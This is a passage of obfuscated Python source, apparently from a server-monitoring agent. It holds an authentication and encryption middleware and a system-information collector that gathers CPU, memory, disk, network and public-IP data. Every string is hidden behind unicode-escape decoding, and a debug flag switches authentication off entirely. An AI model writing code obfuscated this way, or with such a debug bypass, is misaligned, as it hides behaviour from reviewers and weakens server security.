        return {codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape'): secrets.token_hex(8), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_112, codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_112 + O0_var_113, codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape'): O0_var_113, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_108, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_109, codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_110.hex(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_111.hex(), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'): O0_var_107.get_verifying_key(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'): O0_var_111}

class AuthEncryptMiddleware(BaseHTTPMiddleware):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u8ba4\\u8bc1\\u0020\\u002b\\u0020\\u52a0\\u5bc6\\u4e2d\\u95f4\\u4ef6\\u000a\\u0020\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bf7\\u6c42\\u8fdb\\u5165\\u003a\\u0020\\u9a8c\\u8bc1\\u7b7e\\u540d\\u0020\\u002d\\u003e\\u0020\\u89e3\\u5bc6\\u0020\\u0042\\u006f\\u0064\\u0079\\u0020\\u0028\\u5982\\u679c\\u6807\\u8bb0\\u4e86\\u0020\\u0041\\u0045\\u0053\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u54cd\\u5e94\\u8fd4\\u56de\\u003a\\u0020\\u52a0\\u5bc6\\u0020\\u0052\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0020\\u0042\\u006f\\u0064\\u0079\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    async def dispatch(self, request: Request, O0_var_114):
        O0_var_115 = request.headers
        O0_var_116 = request.url.path
        O0_var_117 = [codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
        request.state.is_authenticated = False
        if Config.DEBUG:
            request.state.is_authenticated = True
            return await O0_var_114(request)
        if request.method in [codecs.decode('\\u004f\\u0050\\u0054\\u0049\\u004f\\u004e\\u0053', 'unicode_escape'), codecs.decode('\\u0048\\u0045\\u0041\\u0044', 'unicode_escape')]:
            return await O0_var_114(request)
        O0_var_118 = await request.body()
        O0_var_119 = codecs.decode('', 'unicode_escape')
        if O0_var_118 and O0_var_116 != codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape'):
            O0_var_119 = hashlib.sha256(O0_var_118).hexdigest()
        O0_var_120 = O0_var_115.get(codecs.decode('\\u0078\\u002d\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
        O0_var_121 = O0_var_115.get(codecs.decode('\\u0078\\u002d\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'))
        O0_var_122 = O0_var_115.get(codecs.decode('\\u0078\\u002d\\u0061\\u0075\\u0074\\u0068\\u002d\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
        if not all([O0_var_120, O0_var_121, O0_var_122]):
            if O0_var_116 in O0_var_117:
                return await O0_var_114(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0061\\u0075\\u0074\\u0068\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')})
        try:
            O0_var_123 = None
            O0_var_124 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
            if O0_var_124 is not None:
                O0_var_123 = O0_var_124.get_active_ecdsa_vk()
            O0_var_125 = crypto.identify_signer(request.method, O0_var_116, O0_var_119, O0_var_120, O0_var_121, O0_var_122, O0_var_123)
            request.state.is_authenticated = True
            request.state.key_source = O0_var_125
        except Exception as e:
            if O0_var_116 in O0_var_117:
                return await O0_var_114(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
        O0_var_126 = None
        if O0_var_115.get(codecs.decode('\\u0078\\u002d\\u0061\\u0065\\u0073\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')) == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
            if request.state.is_authenticated:
                if O0_var_118:
                    try:
                        O0_var_127 = O0_var_118.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        O0_var_128 = CryptoManager.decrypt_data(O0_var_127, Config._raw_key)
                        if Config.DEBUG:
                            Logger.debug(codecs.decode('\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0053\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_128[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                        json.loads(O0_var_128)
                        O0_var_126 = O0_var_128.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        request._body = O0_var_126
                    except Exception as e:
                        Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e)))
                        return JSONResponse(status_code=status.HTTP_400_BAD_REQUEST, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
            else:
                return JSONResponse(status_code=status.HTTP_403_FORBIDDEN, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0075\\u006e\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0073', 'unicode_escape')})
        O0_var_129 = False

        async def wrapped_receive():
            nonlocal O0_var_129
            if O0_var_126 is not None:
                if not O0_var_129:
                    O0_var_129 = True
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): O0_var_126, codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
                else:
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
            else:
                if not O0_var_129:
                    O0_var_129 = True
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): O0_var_118, codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
                return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
        request._receive = wrapped_receive
        try:
            response = await O0_var_114(request)
        except Exception as exc:
            raise exc
        if response.headers.get(codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).startswith(codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')):
            O0_var_130 = []
            async for O0_var_131 in response.body_iterator:
                O0_var_130.append(O0_var_131)
            O0_var_132 = b''.join(O0_var_130)
            try:
                O0_var_133 = json.loads(O0_var_132.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
                if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
                    O0_var_134 = crypto.ecies_pubkey
                    if getattr(request.state, codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')) == codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape'):
                        O0_var_124 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
                        if O0_var_124 is not None:
                            O0_var_134 = O0_var_124.get_active_ecies_pub() or O0_var_134
                    O0_var_135 = crypto.encrypt_response(O0_var_133, O0_var_134)
                    O0_var_136 = O0_var_135.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                    if not Config.DEBUG:
                        response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
                        response.headers[codecs.decode('\\u0078\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')] = Config.AGENT_VERSION
                else:
                    O0_var_136 = O0_var_132
                    response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')
                response.body_iterator = self._async_iter([O0_var_136])
                response.headers[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(O0_var_136))
            except json.JSONDecodeError:
                pass
        return response

    @staticmethod
    async def _async_iter(items):
        for O0_var_137 in items:
            yield O0_var_137

class SystemInfoCollector:
    codecs.decode('\\u7cfb\\u7edf\\u4fe1\\u606f\\u6536\\u96c6\\u5668\\u0020\\u0028\\u5df2\\u4fee\\u590d\\u8de8\\u8bf7\\u6c42\\u5b9e\\u4f8b\\u5316\\u751f\\u547d\\u5468\\u671f\\u5bfc\\u81f4\\u7684\\u0020\\u0030\\u0025\\u0020\\u72b6\\u6001\\u0020\\u0042\\u0075\\u0067\\u0029', 'unicode_escape')
    _last_cpu_times = None
    _last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): 0, codecs.decode('\\u0074\\u0078', 'unicode_escape'): 0}
    _total_network_up = 0
    _total_network_down = 0
    _last_network_time = time.time()
    _cpu_init_lock = asyncio.Lock()

    def __init__(self):
        pass

    async def get_basic_info(self) -> Dict[str, Any]:
        O0_var_138 = self._get_linux_distribution()
        O0_var_139, O0_var_140 = await asyncio.gather(self._get_public_ip_v4(), self._get_public_ip_v6(), return_exceptions=True)
        O0_var_139 = O0_var_139 if not isinstance(O0_var_139, Exception) else None
        O0_var_140 = O0_var_140 if not isinstance(O0_var_140, Exception) else None
        if isinstance(O0_var_139, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0034\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_139), 1)
            O0_var_139 = None
        if isinstance(O0_var_140, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0036\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_140), 1)
            O0_var_140 = None
        O0_var_141 = str(O0_var_138['name']) + codecs.decode('\\u0020', 'unicode_escape') + str(O0_var_138['version']) if O0_var_138[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')] != codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape') else platform.system()
        O0_var_142 = {codecs.decode('\\u0061\\u0072\\u0063\\u0068', 'unicode_escape'): platform.machine(), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u0063\\u006f\\u0072\\u0065\\u0073', 'unicode_escape'): psutil.cpu_count(), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): self._get_cpu_name(), codecs.decode('\\u0064\\u0069\\u0073\\u006b\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): await self._get_disk_total(), codecs.decode('\\u0067\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0070\\u0076\\u0034', 'unicode_escape'): O0_var_139, codecs.decode('\\u0069\\u0070\\u0076\\u0036', 'unicode_escape'): O0_var_140, codecs.decode('\\u006d\\u0065\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): self._get_container_mem_limit(), codecs.decode('\\u006f\\u0073', 'unicode_escape'): O0_var_141, codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): platform.release(), codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): psutil.swap_memory().total, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): self._get_virtualization()}
        Logger.debug(codecs.decode('\\u57fa\\u7840\\u4fe1\\u606f\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_142, indent=2)), 1)
        return O0_var_142

    async def get_realtime_info(self) -> Dict[str, Any]:
        O0_var_143 = await self._get_cpu_usage()
        O0_var_144 = await self._get_network_stats()
        O0_var_145 = await self._get_memory_info()
        O0_var_146 = await self._get_disk_info()
        try:
            O0_var_147 = len(psutil.pids())
        except Exception as e:
            O0_var_147 = 0
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u8fdb\\u7a0b\\u6570\\u5931\\u8d25\\uff1a', 'unicode_escape') + str(e), 1)
        O0_var_148 = {codecs.decode('\\u0063\\u0070\\u0075', 'unicode_escape'): {codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_143}, codecs.decode('\\u0072\\u0061\\u006d', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_145[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_145[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u0073\\u0077\\u0061\\u0070', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_145[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_145[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'): {codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): round(psutil.getloadavg()[0] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): round(psutil.getloadavg()[1] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): round(psutil.getloadavg()[2] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2)}, codecs.decode('\\u0064\\u0069\\u0073\\u006b', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_146[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_146[codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006e\\u0065\\u0074\\u0077\\u006f\\u0072\\u006b', 'unicode_escape'): {codecs.decode('\\u0075\\u0070', 'unicode_escape'): O0_var_144[codecs.decode('\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): O0_var_144[codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): O0_var_144[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): O0_var_144[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape')]}, codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0073', 'unicode_escape'): {codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): await self._get_tcp_connections(), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): await self._get_udp_connections()}, codecs.decode('\\u0075\\u0070\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): int(time.time() - psutil.boot_time()), codecs.decode('\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_147, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape')}
        Logger.debug(codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_148, indent=2)), 2)
        return O0_var_148

    def _get_cpu_name(self) -> str:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                import winreg
                O0_var_149 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, codecs.decode('\\u0048\\u0041\\u0052\\u0044\\u0057\\u0041\\u0052\\u0045\\u005c\\u0044\\u0045\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054\\u0049\\u004f\\u004e\\u005c\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u005c\\u0043\\u0065\\u006e\\u0074\\u0072\\u0061\\u006c\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u005c\\u0030', 'unicode_escape'))
                O0_var_150 = winreg.QueryValueEx(O0_var_149, codecs.decode('\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))[0]
                winreg.CloseKey(O0_var_149)
                return O0_var_150.strip()
            else:
                with open(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_151:
                    for O0_var_152 in O0_var_151:
                        if O0_var_152.strip().startswith(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u006c\\u0020\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')):
                            return O0_var_152.split(codecs.decode('\\u003a', 'unicode_escape'))[1].strip()
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u540d\\u79f0\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 1)
        return codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0043\\u0050\\u0055', 'unicode_escape')

    async def _get_cpu_usage(self) -> float:
        try:
            O0_var_153 = psutil.cpu_times()
            async with SystemInfoCollector._cpu_init_lock:
                if SystemInfoCollector._last_cpu_times is None:
                    SystemInfoCollector._last_cpu_times = O0_var_153
                    await asyncio.sleep(0.1)
                    O0_var_153 = psutil.cpu_times()
                O0_var_154 = SystemInfoCollector._last_cpu_times
                SystemInfoCollector._last_cpu_times = O0_var_153
            O0_var_155 = sum(O0_var_153) - sum(O0_var_154)
            O0_var_156 = O0_var_153.idle - O0_var_154.idle
            if O0_var_155 <= 0:
                return 0.0
            O0_var_157 = (O0_var_155 - O0_var_156) / O0_var_155 * 100
            return round(max(0.0, min(100.0, O0_var_157)), 2)
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return 0.0

    def _get_container_mem_limit(self) -> int:
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006d\\u0061\\u0078', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_158:
                    O0_var_159 = O0_var_158.read().strip()
                    if O0_var_159 != codecs.decode('\\u006d\\u0061\\u0078', 'unicode_escape'):
                        return int(O0_var_159)
        except (OSError, ValueError):
            pass
        try:
            if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u006c\\u0069\\u006d\\u0069\\u0074\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_158:
                    O0_var_159 = int(O0_var_158.read().strip())
                    if O0_var_159 < 9223372036854771712:
                        return O0_var_159
        except (OSError, ValueError):
            pass
        return psutil.virtual_memory().total

    def _get_container_mem_usage(self) -> int:
        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_160:
                    O0_var_161 = int(O0_var_160.read().strip())
                O0_var_162 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_160:
                    for O0_var_163 in O0_var_160:
                        O0_var_164 = O0_var_163.strip().split()
                        if len(O0_var_164) == 2 and O0_var_164[0] == codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'):
                            O0_var_162 = int(O0_var_164[1])
                            break
                return max(0, O0_var_161 - O0_var_162)
            except (OSError, ValueError):
                pass
